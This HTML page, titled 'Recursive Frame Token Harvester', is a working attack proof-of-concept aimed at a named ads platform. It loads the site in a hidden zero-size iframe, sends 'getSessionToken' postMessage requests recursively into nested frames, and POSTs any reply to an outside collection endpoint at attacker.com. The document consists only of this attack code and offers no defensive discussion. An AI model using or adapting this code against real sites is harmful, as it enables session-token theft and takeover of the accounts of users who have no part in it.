<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Recursive Frame Token Harvester</title>
</head>
<body>
    <iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            const iframe = document.getElementById('victim');

            iframe.onload = function () {
                const outerFrame = iframe.contentWindow;

                // Start recursive postMessage broadcast
                broadcastToFrames(outerFrame);
            };

            // Recursive function to go deep into nested frames
            function broadcastToFrames(frame) {
                try {
                    // Send payload to current frame
                    frame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');

                    // Go deeper if there are nested frames
                    if (frame.frames && frame.frames.length > 0) {
                        for (let i = 0; i < frame.frames.length; i++) {
                            broadcastToFrames(frame.frames[i]);
                        }
                    }
                } catch (e) {
                    console.warn('Cross-origin or inaccessible frame:', e);
                }
            }

            // Listen for tokens coming from any frame
            window.addEventListener('message', (e) => {
                if (e.origin === 'https://ads.tiktok.com' && e.data) {
                    console.log('ðŸŽ¯ Token received:', e.data);

                    // Optional: Exfiltrate token to your server
                    fetch('https://attacker.com/collect', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({ token: e.data })
                    });
                }
            });
        });
    </script>
</body>
</html>
